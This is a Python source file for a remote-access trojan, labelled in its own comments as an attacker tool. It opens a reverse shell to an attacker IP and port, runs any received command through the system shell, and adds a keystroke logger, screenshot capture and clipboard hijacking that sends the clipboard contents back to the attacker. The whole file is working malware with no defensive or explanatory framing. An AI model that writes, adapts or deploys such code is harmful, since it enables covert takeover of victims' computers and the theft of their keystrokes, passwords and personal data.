import socket
import subprocess
import os
import threading
import pyperclip  # Clipboard hijacking
import mss  # Screenshot capture
from pynput import keyboard

attacker_ip = "127.0.0.1"   # Attacker IP
attacker_port = 4444        # Listening Port

# Keylogger Setup
log_file = "keylog.txt"

def on_press(key):
    with open(log_file, "a") as file:
        try:
            file.write(f"{key.char}")
        except AttributeError:
            file.write(f" [{key}] ")

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

# Screenshot Capture
def capture_screenshot(client):
    with mss.mss() as sct:
        screenshot = sct.shot(output="screenshot.png")  # Save the screenshot
    client.send(b"[+] Screenshot Taken!")

# Clipboard Hijacking
def clipboard_logger(client):
    try:
        clipboard_data = pyperclip.paste()  # Get clipboard contents
        if clipboard_data:
            client.send(clipboard_data.encode())
        else:
            client.send(b"[+] Clipboard is empty.")
    except Exception as e:
        client.send(f"Error: {str(e)}".encode())

# Reverse Shell Function
def connect_to_attacker():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((attacker_ip, attacker_port))

    current_dir = os.getcwd()  # Get current working directory

    while True:
        cmd = client.recv(1024).decode()
        if cmd.lower() == "exit":
            break
        elif cmd.lower() == "screenshot":
            capture_screenshot(client)
        elif cmd.lower() == "keylog":
            client.send(b"[+] Keylogger Started!")
            start_keylogger()
        elif cmd.lower() == "clipboard":
            clipboard_logger(client)
        elif cmd.lower() == "shell":
            client.send(f"[+] Shell Mode Activated! Current Dir: {current_dir}".encode())
            while True:
                shell_cmd = client.recv(1024).decode()
                if shell_cmd.lower() == "exit_shell":
                    break
                elif shell_cmd.lower().startswith("cd "):
                    new_dir = shell_cmd[3:].strip()
                    try:
                        os.chdir(new_dir)  # Change directory
                        current_dir = os.getcwd()  # Update current directory
                        client.send(f"Changed directory to: {current_dir}\n".encode())
                    except Exception as e:
                        client.send(f"Error: {str(e)}\n".encode())
                else:
                    output = subprocess.run(shell_cmd, shell=True, capture_output=True, text=True)
                    client.send(output.stdout.encode() + output.stderr.encode())

    client.close()

# Start Connection
t1 = threading.Thread(target=connect_to_attacker)
t1.start()
